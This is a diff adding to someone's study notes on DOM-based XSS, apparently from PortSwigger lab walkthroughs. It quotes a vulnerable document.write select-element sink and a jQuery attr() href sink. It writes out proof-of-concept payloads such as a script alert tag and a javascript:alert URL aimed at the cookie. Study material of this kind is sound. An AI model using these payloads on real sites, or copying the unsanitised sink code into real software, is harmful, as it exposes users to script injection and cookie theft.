@@ -236,5 +236,72 @@ document.write('</select>');
 - The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements. For example:
 
 `element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'`
+## [Laboratory](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
+ - when we select a city name ..
+ - ![[xss-ports-bal4-1.png]]
+- This is the code.
+```js
+var stores = ["London","Paris","Milan"];
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+document.write('<select name="storeId">');
+	if(store) {
+		document.write('<option selected>'+store+'</option>');
+}
+for(var i=0;i<stores.length;i++) {
+	if(stores[i] === store) {
+		continue;
+	}
+	document.write('<option>'+stores[i]+'</option>');
+}
+document.write('</select>');
+```
+- we see if storeId parameter To exist It is placed inside a select tag and an option tag.
+- ![[xss-ports-bal4-2.png]]
+- ok we have exploit
+- ![[xss-ports-bal4-3.png]]
+```html
+<script>alert(1)</script>
+```
 
 
+###  Sources and sinks in third-party dependencies
+- modern web application use's libraries and frameworks, for additional capabilities
+- some of these are also potential sources and sinks for DOM XSS. 
+#### DOM XSS in jQuery
+- look out for sinks that can alter DOM elements on the page. 
+- for example:
+```js
+attr()
+```
+- function can change the attributes of DOM elements
+- f data is read from a user-controlled source like the URL, then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS.
+	- example
+```js
+$(function() {
+$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl')); 
+});
+```
+- You can exploit this by modifying the URL so that the `location.search` source contains a malicious JavaScript URL. After the page's JavaScript applies this malicious URL to the back link's `href`, clicking on the back link will execute it:
+
+`
+```url
+?returnUrl=javascript:alert(document.domain)
+```
+#### [Laboratory](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
+- we when submitted a feedback .. 
+- this function set a url for back
+```js
+$(function() {
+		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+});
+```
+- ![[xss-ports-bal5-1.png]]
+- ![[xss-ports-bal5-2.png]]
+- ok let's go exploiting
+```js
+javascript:alert(documnet.cookie)
+```
+- ![[xss-ports-bal5-3.png]]
+- and click `back`
+- ![[xss-ports-bal5-4.png]]
+- 
